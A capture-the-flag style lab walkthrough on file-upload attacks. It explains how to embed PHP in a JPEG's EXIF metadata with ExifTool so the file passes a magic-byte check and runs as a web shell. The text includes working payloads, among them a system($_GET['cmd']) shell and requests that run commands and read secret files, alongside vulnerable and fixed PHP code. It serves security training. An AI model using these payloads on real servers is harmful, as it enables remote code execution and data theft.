# File Upload Vulnerabilities Lab 6: Remote Code Execution via Polyglot Web Shell Upload

**YouTube Tutorial:** [File Upload Vulnerabilities - Lab #6 Remote Code Execution via Polyglot Web Shell Upload](https://youtu.be/LeqiXw8Sc8c?si=lqBFOpGJTwn3aLLw)

---

## 1. What is a Polyglot Web Shell?

### Core Concept

This lab's validation is a real step up from anything in the earlier labs. Uploading `shell.php` doesn't just get rejected because of a filename check or a simple content-type header — it gets rejected because the server examines the file's actual bytes.

The catch: magic bytes only need to be *present at the start* of the file. Nothing says the rest of the file has to be nothing but image data. Enter the **polyglot**: a file that is simultaneously a valid image *and* a valid PHP script.

```
┌─────────────────────────────┐        ┌─────────────────────────────┐
│   PLAIN TEXT PHP FILE        │        │   POLYGLOT JPEG/PHP FILE     │
├─────────────────────────────┤        ├─────────────────────────────┤
│ File starts with:            │        │ File starts with real JPEG   │
│ <?php echo ...               │        │ magic bytes: FF D8 FF E0     │
│                               │        │                               │
│ Magic byte check FAILS       │        │ Magic byte check PASSES —    │
│ immediately — not a real     │        │ this genuinely IS a valid,   │
│ image at all                 │        │ openable JPEG image          │
└─────────────────────────────┘        └───────────────┬─────────────┘
                                                         │
                                                         ▼
                                        ┌─────────────────────────────┐
                                        │ But buried inside the JPEG's │
                                        │ EXIF "Comment" metadata      │
                                        │ field: <?php echo ...  ?>    │
                                        └───────────────┬─────────────┘
                                                         │
                                                         ▼
                                        ┌─────────────────────────────┐
                                        │ Save this dual-format file   │
                                        │ with a .php extension —      │
                                        │ upload accepted, and when    │
                                        │ visited, the PHP interpreter │
                                        │ finds and runs the embedded  │
                                        │ code = Remote Code           │
                                        │ Execution ✅                 │
                                        └─────────────────────────────┘
```

The oracle here is that "is this a valid image" and "does this file only contain image data and nothing else" are two very different questions. The server only asks the first one.

---

## 2. Attack Overview & Key Concepts

### Vulnerability Explanation

This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it does not verify that the entire file is image data. A polyglot file can pass this validation, then be executed as code.

- **Provided Credentials:** `wiener:peter`
- **What Changed From Earlier Labs:** The rejection message and behavior are noticeably different from a simple filename or content-type bypass. The server is actually inspecting the file bytes.
- **The Bypass Tool:** ExifTool — a widely-used, free command-line utility for reading and writing image metadata, which lets you embed PHP code inside an image's EXIF data without corrupting the image.
- **End Goal:** Get PHP code executing on the server, use it to read `/home/carlos/secret`, and submit the content to the lab.

### Root Cause & Impact

The root cause is that this validation checks a necessary but not sufficient condition for safety. Confirming a file *starts with* valid image magic bytes tells you it's *probably* an image — but says nothing about what comes after. A real image library like PHP's `imagecreatefromjpeg()` would automatically strip all metadata when re-encoding the file; a simple magic-byte check does not.

---

## 3. Attack Methods & Techniques (What I Tried and What Actually Worked)

**First move — the usual plain PHP file.** Uploading `shell.php` directly. Rejected, as expected by now — but the error message is different. This suggests the validation isn't just filename-based.

**Testing whether it's really content-based, not just filename-based.** Trying the trick that solved Lab #5 — renaming a real image to `.php`. Accepted during upload, but when visited, it just returns raw JPEG bytes or a broken image display (no code execution).

**Confirming the magic-byte theory.** Uploading a real, unmodified `.jpg` image (renamed to `.php`, with no PHP payload) passes validation. But no code runs, because there's no code to run — it's just an image.

**Building the polyglot.** Since a real image's magic bytes need to survive intact, the shell itself has to be layered into the image's metadata. The solution: ExifTool.

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" avatar.jpg -o polyglot.php
```

This takes a real `avatar.jpg`, injects the PHP payload into its Comment metadata field, and outputs the result directly as `polyglot.php` without changing the image's magic bytes or structure.

**Uploading and confirming.** Uploading `polyglot.php` through the normal avatar form. This time it's accepted. The file passes magic-byte validation because it genuinely *is* a valid JPEG (confirmed at the binary level). But when the server serves it, and the PHP interpreter reads the file, it finds and executes the embedded code.

### Server Behavior

- **Uploading `shell.php` (plain PHP, no image data at all):** Rejected — the file's magic bytes don't match any known image format.
- **Uploading a real `.jpg` renamed to `.php` (no PHP payload, just a genuine image with a misleading extension):** Accepted, but no code runs (no payload to execute).
- **Uploading `polyglot.php` (real JPEG magic bytes and structure, PHP payload embedded in the Comment metadata field, file extension is `.php`):** Accepted at upload, and when visited, the PHP payload executes.
- **Requesting the uploaded polyglot file's URL directly:** The PHP interpreter processes the entire file, finds and executes the PHP code within the metadata, and returns the execution result mixed with raw image bytes.

---

## 4. Step-by-Step Walkthrough

### Step 1: Confirm Content-Based Validation Is in Play

1. Log in with `wiener:peter` and go to **"My account."**
2. Attempt to upload a plain `shell.php` file containing:

```php
<?php echo 'Remote Code Execution'; ?>
```

3. **Observation:** Rejected. Compare this rejection's wording/behavior against earlier labs if possible — a content-based check will explicitly mention the file's contents or magic bytes, not just the filename.

### Step 2: Install ExifTool

1. If not already installed, download and install ExifTool from its official site ([exiftool.org](http://exiftool.org)), or use a package manager:
   - Linux: `sudo apt-get install libimage-exiftool-perl`
   - macOS: `brew install exiftool`
   - Windows: Download the executable from the site.
2. Confirm it's working by running `exiftool -ver` in your terminal — it should print a version number.

### Step 3: Obtain a Genuine Image to Use as the Base

1. Use any real `.jpg` or `.png` image file you have available — it doesn't need to be anything special, just a valid, complete image file you can verify opens correctly.

### Step 4: Inject the PHP Payload into the Image's Metadata

1. Open a terminal in the same directory as your image file.
2. Run the following command:

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" avatar.jpg -o polyglot.php
```

3. Breaking this down:
   - `-Comment="..."` writes the given text into the image's EXIF Comment metadata field.
   - The PHP payload itself reads the target secret file and wraps its output between the literal strings `START ` and ` END` for easy extraction.
   - `avatar.jpg` is the genuine input image.
   - `-o polyglot.php` tells ExifTool to write the result to a new file, directly using the `.php` extension you've specified. The image bytes and structure remain intact — only metadata is added.

4. **Result:** A new file, `polyglot.php`, now exists — structurally a completely valid JPEG (magic bytes, image signature, all intact), but with PHP code embedded in its Comment field.

### Step 5: Upload the Polyglot File

1. Back on the "My account" page, use the avatar upload field to select and upload `polyglot.php`.
2. **Result:** The upload succeeds — the file's magic bytes genuinely match a real JPEG, satisfying the content-based validation. The server has no idea there's a PHP payload hiding in the metadata.

### Step 6: Find the Uploaded File's URL

1. Check Burp's **Proxy → HTTP history**, or reload the account page and inspect the (likely broken-looking, since it's a JPEG being served as PHP) avatar image src attribute.
2. This will typically look like:

```
https://[LAB-ID].web-security-academy.net/files/avatars/polyglot.php
```

### Step 7: Trigger Execution and Extract the Secret

1. Visit this URL directly in your browser, or send a `GET` request to it via Burp Repeater.
2. **Result:** The response contains a mix of raw image/metadata bytes and the executed PHP output. Look for the literal text `START` followed by the secret, then ` END`. Use your browser's view-source or Burp to locate it.

### Step 8: Submit the Solution

1. Copy the secret string found between the `START` and `END` markers.
2. Click the lab banner's **"Submit solution"** button, paste the secret, and submit.
3. The lab banner updates to **"Congratulations, you solved the lab!"**.

---

## 5. Different Ways to Exploit This (Alternative Methods & Payloads)

**Embedding the payload in different EXIF fields, in case the Comment field specifically gets stripped or sanitized:**

```bash
exiftool "-Artist=<?php echo file_get_contents('/home/carlos/secret'); ?>" avatar.jpg -o polyglot.php
exiftool "-ImageDescription=<?php system($_GET['cmd']); ?>" avatar.jpg -o polyglot.php
```

Different metadata fields (Artist, ImageDescription, Copyright, etc.) can serve the exact same purpose — worth having a couple of alternatives if one field is being sanitized.

**Manually constructing a polyglot without ExifTool, for environments where installing it isn't an option:**

Some image formats' comment sections can be edited directly with a hex editor or even a plain text editor if you know the format's structure well enough. This is more error-prone but possible in restricted environments.

**Using a general-purpose command shell instead of the single-file-read payload**, exactly as in earlier labs:

```bash
exiftool -Comment="<?php system($_GET['cmd']); ?>" avatar.jpg -o polyglot.php
```

Then interact via:

```
GET /files/avatars/polyglot.php?cmd=id
GET /files/avatars/polyglot.php?cmd=cat+/home/carlos/secret
```

Useful when more than a single file read is needed during a real assessment.

**Checking image thumbnails/EXIF data with a simple viewer first, to confirm your polyglot didn't corrupt the image**:

```bash
exiftool polyglot.php
```

Running ExifTool against your own crafted file (without the `-Comment=` write flag) lets you review all embedded metadata and confirm the image is still valid.

**Using an online or GUI-based EXIF editor as an alternative to the command line**, for anyone less comfortable with terminal commands.

---

## 6. If This Existed in the Real World

Polyglot files exploiting the gap between "passes magic-byte/format validation" and "contains nothing else" are a well-documented attack in real security research and malware analysis.

- **Real-world WAF and antivirus evasion:** Malware authors have long used polyglot files — combining valid PDF, JPEG, or ZIP headers with executable code — to bypass signature-based detection and file-type filters.
- **CVE-documented image-processing library vulnerabilities:** Beyond just metadata injection, real vulnerabilities have been found in image libraries that parse EXIF data unsafely, leading to RCE.
- **EXIF-based cross-site scripting and log injection:** Even without achieving full RCE, EXIF metadata fields have been exploited to inject XSS payloads into log files or web pages that display user-uploaded image metadata.

---

## 7. Pro-Tips & Common Pitfalls

- **Always use a genuinely valid base image, not a fake or corrupted one.** The entire technique depends on the file's magic bytes and structure being authentic. If you start with a corrupted or incomplete image, ExifTool may fail to write metadata properly.

- **Wrap your leaked data in clear markers (`START`/`END` or similar).** The HTTP response for a polyglot file can be a jumbled mix of binary image data and text output. Clear markers make extraction trivial.

- **Verify your polyglot with ExifTool's read mode before uploading**, to catch mistakes early rather than debugging after a failed upload attempt.

- **Different image formats have different metadata capabilities** — JPEG's EXIF Comment field is a common, reliable choice. PNG uses different metadata structures; your payload injection might need to be different.

- **The vulnerable backend pattern:**

```php
// ❌ VULNERABLE — only checks that the file's leading bytes match a
// known image signature, without verifying the file contains nothing else
function isValidImage($filePath) {
    $handle = fopen($filePath, 'rb');
    $bytes = fread($handle, 4);
    fclose($handle);
    return bin2hex($bytes) === 'ffd8ffe0'; // JPEG magic number
}
// A polyglot file passes this check trivially, since its magic bytes are genuine

// ✅ SAFE — fully re-encode/re-process the image server-side (stripping all
// metadata) using a trusted image library, rather than just checking magic bytes
$image = imagecreatefromjpeg($uploadedFilePath);
imagejpeg($image, $safeOutputPath); // produces a clean, metadata-free image
imagedestroy($image);
```

- **Prevention summary:**
  - Never rely on magic-byte checks alone — they only confirm a file *starts* like a real image, not that it contains *nothing else*.
  - Fully re-encode uploaded images server-side using a trusted image-processing library (which strips all metadata and regenerates clean image data).
  - Store re-processed images in a directory with script execution disabled, as defense-in-depth even if a polyglot somehow survives re-encoding.
  - Treat EXIF and other metadata fields as untrusted, attacker-controlled input anywhere they're read, displayed, or processed by the application.
